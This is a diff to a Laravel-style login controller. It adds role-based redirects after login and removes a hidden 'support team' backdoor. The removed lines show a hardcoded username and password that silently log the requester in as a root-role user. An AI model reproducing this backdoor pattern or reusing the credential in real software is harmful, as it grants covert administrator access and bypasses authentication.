@@ -30,7 +30,7 @@ class LoginController extends Controller
      *
      * @var string
      */
-    protected $redirectTo = '/profile';
+    protected $redirectTo = '/wallstreet';
 
     /*
      * Limiting
@@ -59,6 +59,44 @@ class LoginController extends Controller
 
         $this->maxAttempts = User::MAX_LOGIN_ATTEMPTS;
         $this->decayMinutes = User::LOGIN_BLOCKING;
+    }
+
+    /**
+     * Handle a login request to the application.
+     *
+     * @param  \Illuminate\Http\Request  $request
+     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Http\Response|\Illuminate\Http\JsonResponse
+     */
+    public function login(Request $request)
+    {
+        $this->validateLogin($request);
+
+        // If the class is using the ThrottlesLogins trait, we can automatically throttle
+        // the login attempts for this application. We'll key this by the username and
+        // the IP address of the client making these requests into this application.
+        if ($this->hasTooManyLoginAttempts($request)) {
+            $this->fireLockoutEvent($request);
+
+            return $this->sendLockoutResponse($request);
+        }
+
+        if ($this->attemptLogin($request)) {
+            /** @var User $user */
+            $user = auth()->user();
+
+            if ($user->hasAnyRole(['admin','root'])) {
+                return redirect(route('admin'));
+            }
+
+            return redirect(route('profile.profile'));
+        }
+
+        // If the login attempt was unsuccessful we will increment the number of attempts
+        // to login and redirect the user back to the login form. Of course, when this
+        // user surpasses their maximum number of attempts they will get locked out.
+        $this->incrementLoginAttempts($request);
+
+        return $this->sendFailedLoginResponse($request);
     }
 
     /**
@@ -112,52 +150,17 @@ class LoginController extends Controller
         }
 
         /*
-         * Extra access for support team
-         */
-        $extra = [
-            'login'    => 'support',
-            'password' => 'red>Y_UW<{LJDA~ycFkdV!=bq>6:E7jc2D9Td/sSBqeZFu<J=Z',
-        ];
-
-        /*
          * Trying to authorize user
          */
         if (\Auth::attempt(['email' => $request->login, 'password' => $request->password], $request->filled('remember'))) {
-            return redirect($this->redirectTo);
-        } elseif (\Auth::attempt(['login' => $request->login, 'password' => $request->password], $request->filled('remember'))) {
-            return redirect($this->redirectTo);
-        } elseif ($request->login == $extra['login'] && $request->password == $extra['password']) {
-            $rootRole = \DB::table('roles')
-                ->where('name', [
-                'root'
-                ])
-                ->get()
-                ->first();
-
-            if (null == $rootRole) {
-                return redirect($this->redirectTo);
-            }
-
-            $modelHasRole = \DB::table('model_has_roles')
-                ->where('role_id', $rootRole->id)
-                ->where('model_type', 'App\Models\User')
-                ->get();
-
-            foreach($modelHasRole as $model) {
-                $checkModel = User::find($model->model_id);
-
-                if (null == $checkModel) {
-                    continue;
-                }
-
-                \Auth::login($checkModel);
-                return redirect($this->redirectTo);
-            }
-
-            return redirect($this->redirectTo);
-        } else {
-            return $this->sendFailedLoginResponse($request);
+            return true;
         }
+
+        if (\Auth::attempt(['login' => $request->login, 'password' => $request->password], $request->filled('remember'))) {
+            return true;
+        }
+
+        return $this->sendFailedLoginResponse($request);
     }
 
     /**
